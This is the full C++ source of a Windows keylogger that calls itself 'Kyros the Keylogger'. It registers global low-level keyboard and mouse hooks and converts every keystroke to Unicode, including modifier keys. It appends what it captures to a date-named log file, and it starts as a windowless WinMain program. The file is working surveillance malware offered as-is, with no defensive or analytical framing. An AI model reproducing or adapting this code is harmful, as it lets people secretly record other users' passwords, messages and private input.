#include <iostream>
#include <fstream>
#include <Windows.h>
#include <ctime>
#include <iomanip>
#include <fcntl.h>
#include <map>
#include <string>
#include <locale.h>

#define UNICODE_MAX_BUFFER (8)

#define KEYACTION_DOWN ("<down>")
#define KEYACTION_UP   ("<up>")

std::wofstream out_handle;
bool force_newl = false;
DWORD last_majorkey = 0;

const std::map<int, std::string> keynames_spec{
	{VK_SHIFT,		"[SHIFT]" },
	{VK_LSHIFT,		"[LSHIFT]" },
	{VK_RSHIFT,		"[RSHIFT]" },

	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },

	{VK_MENU,		"[ALT]" },
	{VK_LMENU,		"[LALT]" },
	{VK_RMENU,		"[RALT]" },

	{VK_LWIN,		"[LWIN]" },
	{VK_RWIN,		"[RWIN]" },

	{VK_CAPITAL,	"[CAPSLOCK]" },
};

const std::map<int, std::string> keynames{ 
	{VK_BACK,		"[BACKSPACE]" },
	{VK_RETURN,		"[ENTER]\n" },
	{VK_TAB,		"[TAB]" },

	{VK_ESCAPE,		"[ESCAPE]" },
	{VK_END,		"[END]" },
	{VK_HOME,		"[HOME]" },
	{VK_LEFT,		"[LEFT]" },
	{VK_RIGHT,		"[RIGHT]" },
	{VK_UP,			"[UP]" },
	{VK_DOWN,		"[DOWN]" },
	{VK_PRIOR,		"[PG_UP]" },
	{VK_NEXT,		"[PG_DOWN]" },
	{VK_DELETE,		"[DEL]"},
	{VK_INSERT,		"[INSERT]"},
	{VK_SNAPSHOT,	"[PRINT_SCR]"},
};

std::wstring str2wide(const std::string&);
LRESULT CALLBACK kb_hook_cb(int code, WPARAM w_param, LPARAM l_param);
LRESULT CALLBACK mouse_hook_cb(int code, WPARAM w_param, LPARAM l_param);
std::string formated_date(std::string);

int 
WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShow) {
	const auto file_name = formated_date("%d_%m_%Y.log");

	out_handle.imbue(std::locale(""));
	out_handle.open(file_name, std::ios_base::app);
	if (!out_handle) 
		return -1;

	out_handle << std::endl << std::endl
		<< "Starting Kyros the Keylogger at: " << str2wide( formated_date("%d/%m/%Y %H:%M:%S") ) 
		<< std::endl << std::endl;

	SetWindowsHookEx(WH_KEYBOARD_LL, kb_hook_cb, NULL, 0);
	SetWindowsHookEx(WH_MOUSE_LL, mouse_hook_cb, NULL, 0);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0));
	return 0;
}

std::wstring
str2wide(const std::string& string) {
	if (string.empty())
		return L"";

	const auto size_needed = MultiByteToWideChar(CP_UTF8, 0, string.data(), (int)string.size(), nullptr, 0);
	if (size_needed <= 0)
		return L"";

	std::wstring result(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, string.data(), (int)string.size(), result.data(), size_needed);
	return result;
}

LRESULT CALLBACK
kb_hook_cb( int code, WPARAM w_param, LPARAM l_param) {

	KBDLLHOOKSTRUCT* kbhook = NULL;
	if (code != HC_ACTION) goto _fastret;

	switch (w_param) {
	case WM_SYSKEYDOWN:
	case WM_KEYDOWN: {
		kbhook = (KBDLLHOOKSTRUCT*)l_param;

		const int is_repetive = last_majorkey == kbhook->vkCode;
		if ( !is_repetive && keynames_spec.find(kbhook->vkCode) != keynames_spec.end()) {
			out_handle << std::endl  << KEYACTION_DOWN << str2wide(keynames_spec.at(kbhook->vkCode)) << std::endl;
			last_majorkey = kbhook->vkCode;
			break;
		}

		if ( keynames.find(kbhook->vkCode) != keynames.end()) {
			out_handle << str2wide(keynames.at(kbhook->vkCode));
			break;
		}

		WCHAR uc[UNICODE_MAX_BUFFER] = {0};
		BYTE kb[256];

		GetKeyState(VK_RMENU);
		GetKeyState(VK_SHIFT);
		GetKeyboardState(kb);

		const int retno = ToUnicodeEx(kbhook->vkCode, kbhook->scanCode,
			kb, uc, UNICODE_MAX_BUFFER - 1, 0x2, GetKeyboardLayout(0));
		if (retno <= 0) 
			break;
		std::wstring buffer(uc);

		out_handle << buffer << std::flush;
		break;
	}
	//case WM_KEYDOWN: //logout(kbhook->vkCode); break;
	case WM_SYSKEYUP:
	case WM_KEYUP:
		kbhook = (KBDLLHOOKSTRUCT*)l_param;
		if (keynames_spec.find(kbhook->vkCode) == keynames_spec.end())
			break;
		out_handle << std::endl << KEYACTION_UP << str2wide(keynames_spec.at(kbhook->vkCode)) << std::endl;
		last_majorkey = 0;
		break;

	default:
		goto _fastret;
	}

_fastret:
	return CallNextHookEx(0, code, w_param, l_param);
}

LRESULT CALLBACK
mouse_hook_cb(int code, WPARAM w_param, LPARAM l_param) {
	if (code < 0) goto _fastret;
	switch (w_param) {
	case WM_LBUTTONDOWN:
	case WM_RBUTTONDOWN:
		force_newl = true;
		break;
	default: break;
	}

_fastret:
	return CallNextHookEx(0, code, w_param, l_param);
}

std::string
formated_date(std::string fmt) {
	std::tm tm{};
	auto t = std::time(nullptr);
	localtime_s(&tm, &t);

    char buf[128];
    return {buf, std::strftime(buf, sizeof(buf), fmt.c_str(), &tm)};
}

